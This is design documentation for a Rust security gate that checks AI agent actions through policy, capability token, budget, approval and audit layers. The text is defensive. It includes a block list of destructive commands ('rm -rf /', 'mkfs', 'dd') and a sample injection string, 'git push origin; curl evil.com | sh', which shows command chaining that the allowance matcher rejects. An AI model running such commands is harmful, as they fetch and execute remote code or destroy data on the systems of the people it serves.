# The Five-Layer Security Gate

Every sensitive action an agent attempts passes through `SecurityInterceptor` before it executes. This single entry point combines five distinct checks in a fixed sequence with **intersection semantics**: every layer that applies must pass. A single veto stops execution immediately. The audit writer runs on every outcome, allowed or denied, and its failure is itself a hard stop.

The implementation lives in `core/crates/astrid-approval`.

---

## What Counts as a Sensitive Action

`SensitiveAction` (`src/action.rs`) is an enum that classifies every operation the interceptor can gate:

```rust
pub enum SensitiveAction {
    FileRead { path: String },
    FileDelete { path: String },
    FileWriteOutsideSandbox { path: String },
    ExecuteCommand { command: String, args: Vec<String> },
    NetworkRequest { host: String, port: u16 },
    TransmitData { destination: String, data_type: String },
    FinancialTransaction { amount: String, recipient: String },
    AccessControlChange { resource: String, change: String },
    CapabilityGrant { resource_pattern: String, permissions: Vec<Permission> },
    McpToolCall { server: String, tool: String },
    CapsuleExecution { capsule_id: String, capability: String },
    CapsuleHttpRequest { capsule_id: String, url: String, method: String },
    CapsuleFileAccess { capsule_id: String, path: String, mode: Permission },
    CapsuleNetBind { capsule_id: String },
}
```

The capsule variants represent host-function calls from the WASM sandbox. Every host call that escapes the sandbox surface must be described as one of these variants before the interceptor can classify it.

---

## The Interceptor

`SecurityInterceptor` (`src/interceptor/mod.rs`) holds all five sub-validators and exposes a single async method:

```rust
pub async fn intercept(
    &self,
    principal: &PrincipalId,
    action: &SensitiveAction,
    context: &str,
    estimated_cost: Option<f64>,
) -> ApprovalResult<InterceptResult>
```

`principal` identifies the invoking agent. All capability and allowance lookups are scoped to it, so Agent A's prior approval cannot authorize Agent B's invocation. Single-tenant callers pass `PrincipalId::default()`.

On success the caller gets back an `InterceptResult`:

```rust
pub struct InterceptResult {
    pub proof: InterceptProof,
    pub audit_id: AuditEntryId,
    pub budget_warning: Option<BudgetWarning>,
}
```

`proof` records how the action was authorized. `audit_id` is the stable identifier of the audit entry written during this call. `budget_warning` surfaces a non-blocking "approaching limit" signal when spend is at or above the configured threshold.

---

## Layer 1: Policy (Hard Boundaries)

`SecurityPolicy` (`src/policy.rs`) is the outermost wall. It is configured by the operator and contains purely static rules that can never be overridden by a capability token, allowance, or user approval.

```rust
pub struct SecurityPolicy {
    pub blocked_tools: HashSet<String>,
    pub approval_required_tools: HashSet<String>,
    pub allowed_paths: Vec<String>,
    pub denied_paths: Vec<String>,
    pub allowed_hosts: Vec<String>,
    pub denied_hosts: Vec<String>,
    pub max_argument_size: usize,
    pub require_approval_for_delete: bool,
    pub require_approval_for_network: bool,
    pub blocked_capsules: HashSet<String>,
}
```

`policy.check(action)` returns one of three variants:

- `PolicyResult::Blocked { reason }`: immediate termination, no further checks.
- `PolicyResult::RequiresApproval(RiskAssessment)`: must pass through the approval layer (Layer 4).
- `PolicyResult::Allowed`: low-risk, proceeds after budget check without needing approval.

The policy evaluation order for each action type is documented precisely in the source:

1. Is the tool explicitly in `blocked_tools`? Blocked.
2. Does the path match a `denied_paths` glob? Blocked.
3. Does the host match `denied_hosts`? Blocked.
4. Does the argument byte length exceed `max_argument_size`? Blocked.
5. Is the tool in `approval_required_tools`? RequiresApproval.
6. Is the action a delete and `require_approval_for_delete` is set? RequiresApproval.
7. Is the action a network request and `require_approval_for_network` is set? RequiresApproval.
8. Otherwise: Allowed.

For file actions, `check_file_path` additionally rejects any path containing a `..` (`ParentDir`) component. This traversal check runs as part of the file-path routing branch, not as a discrete top-level step.

The default policy (`SecurityPolicy::default()`) blocks `rm -rf /`, `sudo`, `mkfs`, `dd`, `shutdown`, and others outright, denies writes to `/etc/**`, `/boot/**`, `/sys/**`, `/proc/**`, and `/dev/**`, requires approval for all deletes and network requests, and enforces a 1 MB argument size limit.

If Layer 1 returns `Blocked`, the interceptor writes a denied audit entry and returns `ApprovalError::PolicyBlocked`. Execution stops here.

---

## Layer 2: Capability Token

`CapabilityValidator` (`src/interceptor/capability.rs`) checks whether the invoking principal already holds a signed capability token that covers the requested resource and permission.

Each `SensitiveAction` maps to a `(resource_uri, Permission)` pair via `action_to_resource_permission`:

| Action variant | Resource URI | Permission |
|---|---|---|
| `McpToolCall { server, tool }` | `mcp://{server}:{tool}` | `Invoke` |
| `FileRead { path }` | `file://{path}` | `Read` |
| `FileDelete { path }` | `file://{path}` | `Delete` |
| `FileWriteOutsideSandbox { path }` | `file://{path}` | `Write` |
| `ExecuteCommand { command, .. }` | `exec://{command}` | `Execute` |
| `NetworkRequest { host, port }` | `net://{host}:{port}` | `Invoke` |
| `CapsuleExecution { capsule_id, capability }` | `capsule://{capsule_id}:{capability}` | `Invoke` |
| `CapsuleHttpRequest { capsule_id, .. }` | `capsule://{capsule_id}:http_request` | `Invoke` |
| `CapsuleFileAccess { capsule_id, mode, .. }` | `capsule://{capsule_id}:file_{read,write,delete}` | `Invoke` |

The validator then calls `astrid_capabilities::CapabilityValidator::check` with an explicit `trust_issuer` constraint set to the runtime key's public bytes. A token signed by any other key is rejected even if the resource pattern and permission match. This prevents tokens minted outside the trusted runtime from being replayed.

If a matching token is found, `store.use_token(&token.id)` is called **before** the audit write. If the token is already consumed, expired, or revoked, `use_token` returns an error and the validator falls through to Layer 4 instead of hard-erroring. This prevents a transient token state from permanently blocking a recoverable approval flow. The TOCTOU window between find and consume is narrowed but not eliminated: two concurrent callers can both pass `validator.check()`, but only one wins the `mark_used` write lock inside `use_token`.

After consumption, the issuer is re-verified against the runtime key (a TOCTOU defense against key rotation between find and use).

If the capability check succeeds, execution jumps to Layer 3 for budget accounting and then straight to audit (Layer 5). Layers 4 and its approval flow are skipped entirely.

---

## Layer 3: Dual Budget

`BudgetValidator` (`src/interceptor/budget.rs`) enforces two independent spend limits via an atomic check-and-reserve protocol.

### Session Budget

`BudgetTracker` (`src/budget.rs`) tracks spending within a session:

```rust
pub struct BudgetConfig {
    pub session_max_usd: f64,
    pub per_action_max_usd: f64,
    pub warn_at_percent: u8,  // default 80
}
```

`check_and_reserve(cost)` runs under a single write lock to prevent TOCTOU races where two concurrent callers both pass the budget check and then both record costs, exceeding the session limit. It checks the per-action cap first (no lock needed, config is immutable), then acquires the write lock and atomically checks the session cap and records the reservation.

The method returns:

- `BudgetResult::Allowed`: within limits, cost reserved.
- `BudgetResult::WarnAndAllow { current_spend, session_max, percent_used }`: at or above the `warn_at_percent` threshold; allowed but the caller receives a `BudgetWarning` to surface to the user.
- `BudgetResult::Exceeded { reason, requested, available }`: hard deny.

### Workspace Budget

`WorkspaceBudgetTracker` tracks cumulative spend across all sessions in a workspace. When `max_usd` is `None`, it still records spend for reporting but never blocks.

### Two-Phase Reservation

`BudgetValidator::check_and_reserve` runs a pre-check on both trackers before reserving anything, then reserves on the workspace tracker first, then the session tracker. If the session reservation fails after the workspace reservation succeeds, it calls `workspace_tracker.refund_cost(cost)` to prevent a resource leak.

Reservations are wrapped in a `BudgetReservation` RAII guard. If the guard is dropped without `.commit()` being called (for example, because audit fails downstream), both trackers are automatically refunded:

```rust
impl Drop for BudgetReservation {
    fn drop(&mut self) {
        if !self.committed {
            if let Some(ref ws_budget) = self.workspace_tracker {
                ws_budget.refund_cost(self.cost);
            }
            self.tracker.refund_cost(self.cost);
        }
    }
}
```

Budget is committed only after a successful audit write. This means a failed audit entry results in the budget being returned to the caller, which is the correct behavior: the audit must be written before the action is considered to have occurred.

`BudgetTracker::restore` clamps persisted `session_spent_usd` to non-negative finite values to prevent budget manipulation via tampered snapshots (`-50.0` would otherwise grant unlimited additional budget, and `f64::NAN` would corrupt every subsequent calculation).

---

## Layer 4: Approval and Allowance

When policy returns `RequiresApproval` and no capability token exists, the interceptor delegates to `ApprovalManager::check_approval` (`src/manager.rs`).

### Allowance Fast-Path

Before prompting the user, the manager checks the `AllowanceStore` for a pre-existing allowance that covers the action:

```rust
self.allowance_store
    .find_matching_and_consume(principal, action, workspace_root)
```

Allowances are scoped to a `PrincipalId`. The store keys on `(principal, id)`, so Agent A's allowance can never match Agent B's invocation. The lookup is an atomic find-and-decrement: if `uses_remaining` reaches zero, the allowance remains in the store but is filtered out by `is_valid()` on subsequent lookups; it is not eagerly removed.

`AllowancePattern` (`src/allowance/pattern.rs`) describes what a given allowance covers:

| Pattern variant | Matches |
|---|---|
| `ExactTool { server, tool }` | Exact `McpToolCall` |
| `ServerTools { server }` | Any tool on a server |
| `FilePattern { pattern, permission }` | File actions matching a glob |
| `NetworkHost { host, ports }` | Network requests to a host, optionally port-restricted |
| `CommandPattern { command }` | Commands matching a glob |
| `WorkspaceRelative { pattern, permission }` | Same as base pattern but path must start with `workspace_root` |
| `CapsuleCapability { capsule_id, capability }` | Specific capsule capability |
| `CapsuleWildcard { capsule_id }` | Any action from a capsule |
| `Custom { pattern }` | Never matches (extensibility stub) |

`CommandPattern` matching explicitly rejects commands containing shell chaining operators (`;`, `&&`, `||`, `|`, `$(`, backtick, newline, `>`, `<`) before the glob is even evaluated. A session allowance for `git push *` cannot be hijacked to execute `git push origin; curl evil.com | sh`.

`WorkspaceRelative` patterns additionally validate that the action's path starts with `workspace_root` using `std::path::Path::starts_with`. An allowance created in `/project-a` cannot match actions targeting `/project-b`.

### Approval Handler

If no allowance matches, the manager sends an `ApprovalRequest` to the registered `ApprovalHandler`:

```rust
#[async_trait]
pub trait ApprovalHandler: Send + Sync {
    async fn request_approval(&self, request: ApprovalRequest) -> Option<ApprovalResponse>;
    fn is_available(&self) -> bool;
}
```

Different frontends implement this trait. The CLI implements it via a terminal prompt. Discord and web frontends implement their own versions. The approval system itself has no knowledge of the UI.

If the handler is not registered, returns `is_available() == false`, or the response `Option` is `None`, the request is deferred to the `DeferredResolutionStore` and `ApprovalError::Deferred` is returned to the caller. The default timeout is 5 minutes.

### Approval Decisions

The user's `ApprovalDecision` (`src/request.rs`) determines what happens next:

```rust
pub enum ApprovalDecision {
    Approve,
    ApproveSession,
    ApproveWorkspace,
    ApproveAlways,
    ApproveWithAllowance(Box<Allowance>),
    Deny { reason: String },
}
```

Each decision maps to a different `InterceptProof` and post-approval action:

**`Approve`**: One-time. No allowance is stored. `InterceptProof::UserApproval { approval_audit_id }` is returned. The user must approve the same action again next time.

**`ApproveSession`**: Creates a session-scoped `Allowance` (`session_only: true`) in the `AllowanceStore` via `AllowanceValidator::create_allowance_for_action`. The allowance is bound to the invoking `PrincipalId` and signed with the runtime key. Returns `InterceptProof::SessionApproval { allowance_id }`. The allowance is cleared when the session ends.

**`ApproveWorkspace`**: Creates a non-session allowance (`session_only: false`) also bound to `workspace_root`. Survives session end but is scoped to the workspace directory. Returns `InterceptProof::WorkspaceApproval { allowance_id }`. Full persistence to `state.db` is a planned follow-on; currently these live in `AllowanceStore` as non-session entries.

**`ApproveAlways`**: Mints a persistent `CapabilityToken` signed by the runtime key and stored in `CapabilityStore`. The token carries the `approval_audit_id` as a chain-link proof so the audit trail connects the user's approval decision to every future use of the token. Default TTL is 1 hour (`ALLOW_ALWAYS_DEFAULT_TTL = Duration::hours(1)`). Returns `InterceptProof::CapabilityCreated { token_id, approval_audit_id }`. Future calls for the same action will hit Layer 2 and skip the approval flow entirely.

**`ApproveWithAllowance(allowance)`**: The handler provides a fully constructed `Allowance` (the user may have specified a custom pattern or use limit via a UI widget). The manager calls `allowance_store.add_allowance(allowance)` and returns `ApprovalProof::CustomAllowance { allowance_id }`. The store validates the pattern and binds it to the principal.

**`Deny { reason }`**: Propagates as `ApprovalOutcome::Denied { reason }`, then `ApprovalError::Denied`.

### Deferred Resolution

When the user is absent (no handler, `is_available()` false, timeout, or `None` response), the action is queued in `DeferredResolutionStore`. The queue persists to a `ScopedKvStore` when one is configured; stale entries older than 24 hours are discarded on reload to prevent replay of outdated requests. When the user returns, they can review pending resolutions and call `resolve_deferred` to apply a retroactive `ApprovalResponse`.

---

## Layer 5: Audit (Fail-Closed)

Every outcome, pass or fail, is written to the `AuditLog` before `intercept()` returns. The audit write is not optional. `audit_allowed`, `audit_denied`, and `audit_deferred` all map `AuditLog::append` errors to `ApprovalError::AuditFailed`, and the caller propagates that error back to the agent. An action whose audit entry cannot be written is treated as denied.

The audit entry carries an `AuthorizationProof` that records how the action was authorized:

| `InterceptProof` | `AuditAuthProof` |
|---|---|
| `Capability { token_id }` | `Capability { token_id, token_hash }` |
| `CapabilityCreated { token_id, .. }` | `Capability { token_id, token_hash }` |
| `Allowance { .. }` / `SessionApproval` / `WorkspaceApproval` | `NotRequired { reason: "covered by allowance" }` |
| `UserApproval { approval_audit_id }` | `UserApproval { user_id, approval_entry_id }` |
| `PolicyAllowed` | `NotRequired { reason: "policy allowed" }` |
| Denied | `Denied { reason }` |

The `approval_entry_id` field on `UserApproval` is the chain-link: it points to the audit entry that recorded the user's original approval decision. This makes it possible to trace any capability-authorized invocation back to the human who approved it, even after many subsequent invocations under `ApproveAlways`.

---

## The Complete Decision Flow

```
intercept(principal, action, context, cost)
│
├── Layer 1: policy.check(action)
│   ├── Blocked  ──────────────────────────────► audit_denied → ApprovalError::PolicyBlocked
│   ├── Allowed  ──────────────► (skip L2, skip L4)
│   │                              │
│   └── RequiresApproval ──────────┤
│                                  │
├── Layer 2: capability_validator.check_capability(principal, action)
│   ├── Some(proof) ──────────────► Layer 3 (budget) ──► audit_allowed → Ok(InterceptResult)
│   └── None ─────────────────────────────────────────────────┐
│                                                              │
├── Layer 3: budget_validator.check_and_reserve(cost)         │ (also runs for cap path)
│   ├── Err(Denied) ───────────────────────────────────► audit_denied → Err
│   └── Ok(reservation) ─────────────────────────────────────►│
│                                                              │
├── Layer 4 (only if RequiresApproval):                       │
│   ├── PolicyAllowed ─────────────────────────────────────────┤
│   └── approval_manager.check_approval(...)                   │
│       ├── Allowed { OneTimeApproval }  ──────────────────────┤
│       ├── Allowed { SessionApproval } ─► create allowance ───┤
│       ├── Allowed { WorkspaceApproval } ► create allowance ──┤
│       ├── Allowed { AlwaysAllow }  ───► mint capability ──────┤
│       ├── Allowed { CustomAllowance } ─► store allowance ────►│
│       ├── Denied ──────────────────────────────────────► audit_denied → Err
│       └── Deferred ────────────────────────────────────► audit_deferred → ApprovalError::Deferred
│                                                              │
└── Layer 5: audit_allowed → reservation.commit() → Ok(InterceptResult)
```

---

## Security Properties

**Intersection semantics.** Policy AND capability (or approval) must both allow an action. There is no path through the interceptor that bypasses the policy layer, even for capability-backed invocations.

**Principal isolation.** Capability tokens carry the `PrincipalId` in their signing payload. `CapabilityValidator::check_capability` passes the invoking principal to `CapabilityValidator::check` and re-verifies the issuer after `use_token`. Allowances are keyed by `(principal, id)` in the store. Cross-principal replay is blocked at both layers.

**Atomic single-use consumption.** Tokens are consumed before the audit write. If audit fails, the token is gone and the action is denied. This accepts the cost of a false deny in exchange for eliminating the token replay window.

**Budget RAII.** `BudgetReservation` refunds on drop if not explicitly committed. Budget committed only after a successful audit write.

**Audit fail-closed.** `ApprovalError::AuditFailed` is a hard error. An action whose audit trail entry cannot be written is treated identically to a denied action.

**Snapshot integrity.** `BudgetTracker::restore` and `WorkspaceBudgetTracker::restore` clamp deserialized `spent` values to non-negative finite `f64` to prevent manipulation via tampered persistence.

**Shell operator rejection.** `CommandPattern` allowances explicitly reject commands containing `;`, `&&`, `||`, `|`, `$(`, backtick, newline, `>`, or `<` before glob evaluation, closing the allowance-escape path for chained commands.

**Path traversal.** Both `SecurityPolicy::check_file_path` and `AllowancePattern::matches_file_glob` call `std::path::Path::components()` and reject any path containing a `ParentDir` component.

---

## Integrating the Interceptor

Instantiate `SecurityInterceptor::new` with the runtime's shared `CapabilityStore`, `ApprovalManager`, `SecurityPolicy`, `BudgetTracker`, `AuditLog`, signing `KeyPair`, `SessionId`, `AllowanceStore`, and optional workspace root and `WorkspaceBudgetTracker`. The `ApprovalManager` requires a separately registered `ApprovalHandler` implementation for the active frontend.

```rust
let interceptor = SecurityInterceptor::new(
    Arc::clone(&capability_store),
    Arc::clone(&approval_manager),
    SecurityPolicy::default(),
    Arc::clone(&budget_tracker),
    Arc::clone(&audit_log),
    Arc::clone(&runtime_key),
    session_id.clone(),
    Arc::clone(&allowance_store),
    Some(workspace_root.clone()),
    Some(Arc::clone(&workspace_budget_tracker)),
);

// Register the frontend handler separately
approval_manager
    .register_handler(Arc::new(my_approval_handler))
    .await;

// Gate every sensitive action
let result = interceptor
    .intercept(&principal, &action, "reason for action", Some(estimated_cost_usd))
    .await?;

// Inspect the proof and surface budget warnings
if let Some(warning) = result.budget_warning {
    // warn the user: warning.percent_used, warning.session_max
}
```

The `result.proof` identifies the authorization path. The `result.audit_id` can be attached to the downstream operation's own audit records to create a complete chain of custody from user approval through execution.

## See also

- [Capabilities, Tokens, and Delegation](capabilities-and-tokens.md)
- [Policy, Budget, Approval, and Audit](policy-budget-approval-audit.md)
- [The Cryptographic Audit Chain](../storage/audit-chain.md)
- [The OS Process Sandbox](os-process-sandbox.md)
